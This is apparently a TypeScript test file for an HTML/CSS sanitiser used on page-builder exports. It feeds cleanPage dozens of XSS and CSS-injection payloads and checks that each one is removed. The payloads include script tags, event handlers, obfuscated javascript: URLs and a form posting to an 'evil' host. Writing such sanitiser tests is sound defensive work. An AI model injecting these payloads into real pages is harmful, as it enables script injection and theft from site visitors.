import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { cleanPage } from "../lib/sites/clean.ts";

// [name, html, regex that must NOT appear in the output, expected `removed` fragment]
const HTML_ATTACKS: [string, string, RegExp, string][] = [
  ["script tag", `<p>a</p><script>alert(1)</script>`, /script|alert/i, "script tag"],
  ["script src", `<script src="https://evil/x.js"></script>`, /script|evil/i, "script tag"],
  ["img onerror", `<img src=x onerror=alert(1)>`, /onerror|alert/i, "onerror attribute on img"],
  ["img onload https", `<img src="https://a/b.png" onload="x()">`, /onload/i, "onload attribute on img"],
  ["div onclick", `<div onclick="x()">hi</div>`, /onclick/i, "onclick attribute on div"],
  ["a javascript href", `<a href="javascript:alert(1)">x</a>`, /javascript/i, "unsafe href URL on a"],
  ["a mixed-case href with space", `<a href=" JaVaScRiPt:alert(1)">x</a>`, /javascript/i, "unsafe href URL on a"],
  ["a tab-split scheme", `<a href="java\tscript:alert(1)">x</a>`, /script:/i, "unsafe href URL on a"],
  ["a entity-encoded scheme", `<a href="&#106;avascript:alert(1)">x</a>`, /script:/i, "unsafe href URL on a"],
  ["a data href", `<a href="data:text/html,<script>alert(1)</script>">x</a>`, /data:/i, "unsafe href URL on a"],
  ["a vbscript href", `<a href="vbscript:msgbox(1)">x</a>`, /vbscript/i, "unsafe href URL on a"],
  ["a protocol-relative", `<a href="//evil.com/x">x</a>`, /evil/i, "unsafe href URL on a"],
  ["img data src", `<img src="data:text/html;base64,PHNjcmlwdD4=">`, /data:/i, "unsafe src URL on img"],
  ["svg script", `<svg><script>alert(1)</script></svg>`, /svg|script|alert/i, "svg tag"],
  ["svg onload", `<svg onload=alert(1)></svg>`, /svg|onload|alert/i, "svg tag"],
  ["math tag", `<math><mi xlink:href="javascript:alert(1)">x</mi></math>`, /math|javascript/i, "math tag"],
  ["evil iframe", `<iframe src="https://evil.com/x"></iframe>`, /iframe|evil/i, "iframe with disallowed src"],
  ["iframe javascript", `<iframe src="javascript:alert(1)"></iframe>`, /iframe|javascript/i, "iframe"],
  ["iframe lookalike host", `<iframe src="https://www.youtube.com.evil.com/embed/x"></iframe>`, /iframe|evil/i, "iframe"],
  [
    "iframe srcdoc",
    `<iframe src="https://www.youtube.com/embed/x" srcdoc="<script>alert(1)</script>"></iframe>`,
    /srcdoc|alert/i,
    "srcdoc attribute on iframe",
  ],
  ["iframe wrong path", `<iframe src="https://www.google.com/search?q=x"></iframe>`, /iframe|google/i, "iframe"],
  ["object", `<object data="https://evil/x.swf"></object>`, /object|evil/i, "object tag"],
  ["embed", `<embed src="https://evil/x.swf">`, /embed|evil/i, "embed tag"],
  ["base href", `<base href="https://evil/">`, /base|evil/i, "base tag"],
  ["meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil">`, /meta|refresh|evil/i, "meta tag"],
  ["link stylesheet", `<link rel="stylesheet" href="https://evil/x.css">`, /link|evil/i, "link tag"],
  ["form action", `<form action="https://evil/steal"><input name=a></form>`, /form|input|evil/i, "form tag"],
  ["input", `<input type="text" onfocus="x()" autofocus>`, /input|onfocus/i, "input tag"],
  ["style tag", `<style>@import url(https://evil/x.css);</style><p>x</p>`, /style|evil|import/i, "style tag"],
  ["inline style js url", `<div style="background:url(javascript:alert(1))">x</div>`, /javascript/i, "javascript:"],
  ["inline style expression", `<div style="width:expression(alert(1))">x</div>`, /expression/i, "expression("],
  [
    "inline style escaped",
    `<div style="background:u\\72l(java\\73 cript:alert(1))">x</div>`,
    /javascript|java\\73|cript:/i,
    "javascript:",
  ],
  ["inline style data html", `<div style="background:url('data:text/html,x')">x</div>`, /data:/i, "url("],
  ["template", `<template><script>alert(1)</script></template>`, /template|script/i, "template tag"],
  ["textarea breakout", `<textarea></textarea><img src=x onerror=alert(1)>`, /onerror|textarea/i, "textarea tag"],
  ["unknown data attr", `<div data-evil="x" data-lead="form">x</div>`, /data-evil/i, "data-evil attribute on div"],
  ["video", `<video src="https://evil/x.mp4" onerror="x()"></video>`, /video|onerror/i, "video tag"],
  ["button formaction", `<button formaction="https://evil">x</button>`, /formaction|evil/i, "formaction attribute on button"],
];

for (const [name, html, bad, expectRemoved] of HTML_ATTACKS) {
  test(`attack: ${name}`, () => {
    const r = cleanPage(html, "");
    assert.doesNotMatch(r.html, bad, `output: ${r.html}`);
    assert.ok(
      r.removed.some((x) => x.includes(expectRemoved)),
      `removed=${JSON.stringify(r.removed)} lacks ${expectRemoved}`,
    );
  });
}

test("target=_blank links get rel=noopener noreferrer", () => {
  const r = cleanPage(`<a href="https://a.com" target="_blank">x</a>`, "");
  assert.match(r.html, /rel="noopener noreferrer"/);
});

const CSS_ATTACKS: [string, string, RegExp][] = [
  ["@import url", `@import url(https://evil/x.css); .a{color:red}`, /import|evil/i],
  ["@import string", `@import "https://evil/x.css"; .a{color:red}`, /import|evil/i],
  ["expression", `.a{width:expression(alert(1))}`, /expression/i],
  ["expression spaced+comment", `.a{width:exp/**/ression(alert(1))}`, /ression\(/i],
  ["url javascript", `.a{background:url(javascript:alert(1))}`, /javascript/i],
  ["url javascript quoted", `.a{background:url("JaVaScRiPt:alert(1)")}`, /javascript/i],
  ["url data text/html", `.a{background:url(data:text/html,<script>alert(1)</script>)}`, /data:text|script/i],
  ["url data svg", `.a{background:url(data:image/svg+xml,<svg onload=alert(1)>)}`, /data:|svg/i],
  ["style breakout", `.a{color:red}</style><script>alert(1)</script>`, /</],
  ["moz-binding", `.a{-moz-binding:url(https://evil/x.xml#y)}`, /binding/i],
  ["behavior", `.a{behavior:url(x.htc)}`, /behavior/i],
  ["css escape", `.a{background:\\75rl(javascript:alert(1))}`, /javascript/i],
];

for (const [name, css, bad] of CSS_ATTACKS) {
  test(`css attack: ${name}`, () => {
    const r = cleanPage("<p>x</p>", css);
    assert.doesNotMatch(r.css, bad, `css out: ${r.css}`);
    assert.ok(r.removed.length > 0, "removed should be non-empty");
  });
}

test("css: benign rules and safe image data URL survive", () => {
  const css = `.a{color:red;background:url(https://cdn.example.com/x.png)}.b{background:url(data:image/png;base64,AAAA)}`;
  const r = cleanPage("", css);
  assert.equal(r.css, css);
  assert.deepEqual(r.removed, []);
});

test("css: good declarations next to bad ones are kept", () => {
  const r = cleanPage("", `.a{color:red;width:expression(1);margin:0}`);
  assert.match(r.css, /color:red/);
  assert.match(r.css, /margin:0/);
  assert.doesNotMatch(r.css, /expression/);
});

test("removed lists each stripped item", () => {
  const r = cleanPage(`<script>1</script><img src=x onerror=1><a href="javascript:1">x</a><object></object>`, "");
  assert.deepEqual(r.removed, ["script tag", "onerror attribute on img", "unsafe href URL on a", "object tag"]);
});

test("allowed iframes survive", () => {
  for (const src of [
    "https://www.youtube.com/embed/abc",
    "https://www.youtube-nocookie.com/embed/abc",
    "https://player.vimeo.com/video/123",
    "https://www.google.com/maps/embed?pb=1",
  ]) {
    const r = cleanPage(`<iframe src="${src}"></iframe>`, "");
    assert.ok(r.html.includes(src), r.html);
    assert.deepEqual(r.removed, []);
  }
});

test("data-lead components keep data-lead, data-id, data-settings", () => {
  const r = cleanPage(`<div data-lead="order" data-id="o9" data-settings='{"a":"b"}'></div>`, "");
  assert.equal(r.html, `<div data-lead="order" data-id="o9" data-settings="{&quot;a&quot;:&quot;b&quot;}"></div>`);
  assert.deepEqual(r.removed, []);
});

test("normal GrapesJS page passes byte-for-byte unchanged", () => {
  const html = readFileSync(new URL("./fixtures/sites/normal-page.html", import.meta.url), "utf8").replace(/\r?\n$/, "");
  const css = `.hero{padding:60px 20px}.btn:hover{opacity:.9}@media (max-width:600px){.row{flex-direction:column}}`;
  const r = cleanPage(html, css);
  assert.equal(r.html, html);
  assert.equal(r.css, css);
  assert.deepEqual(r.removed, []);
});

test("spaced inline styles are only whitespace-normalised", () => {
  const r = cleanPage(`<p style="color: red; margin: 0 auto;">x</p>`, "");
  assert.equal(r.html, `<p style="color:red;margin:0 auto">x</p>`);
  assert.deepEqual(r.removed, []);
});

test("single-quoted data-settings (GrapesJS export) normalises to the canonical form", () => {
  const r = cleanPage(`<div data-lead="form" data-id="f1" data-settings='{"type":"interest"}'></div>`, "");
  assert.ok(r.html.includes(`data-settings="{&quot;type&quot;:&quot;interest&quot;}"`), r.html);
});
